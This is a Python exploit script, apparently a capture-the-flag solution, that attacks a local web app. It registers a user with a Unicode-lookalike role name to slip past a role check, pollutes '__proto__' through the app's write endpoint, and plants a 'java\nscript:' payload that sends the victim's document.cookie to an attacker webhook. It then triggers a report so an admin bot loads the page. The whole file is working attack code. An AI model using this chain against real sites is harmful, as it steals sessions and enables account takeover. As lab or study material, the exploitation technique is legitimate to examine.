import requests
import time

base_url = "http://localhost:3000/api"
webhook = "webhook"  # change
payload = f"java\nscript:location.href='{webhook}/?c='+document.cookie"

session = requests.Session()

def register() :
    register_data = {"id": "a", "pw": "a", "role": "inquiſitor"}
    r = session.post(f"{base_url}/auth/register", json=register_data)

    if r.status_code == 200 :
        print('register success')
    else :
        print('register failed')

def login() :
    login_data = {"id": "a", "pw": "a"}
    r = session.post(f"{base_url}/auth/login", json=login_data)

    if r.status_code == 200 :
        print('login success')
    else :
        print('login failed')

def proto() :
    data = {"devilName" : "__proto__.devil", "description" : payload}

    r = session.post(f"{base_url}/devil/write", json=data)

    if r.status_code == 200 :
        print('proto success')
    else :
        print('proto failed')

def devil() :
    data = {"devilName" : "devil", "description" : "devil"}

    r = session.post(f"{base_url}/devil/write", json=data)

    if r.status_code == 200 :
        print('devil success')
    else :
        print('devil failed')

def report() :
    data = {"devilName" : "devil"}

    r = session.post(f"{base_url}/devil/archdiocese", json=data)

    time.sleep(6)

    if r.status_code == 200 :
        print('report success')
    else :
        print('report failed')

if __name__ == "__main__" :
    register()
    login()
    proto()
    devil()
    report()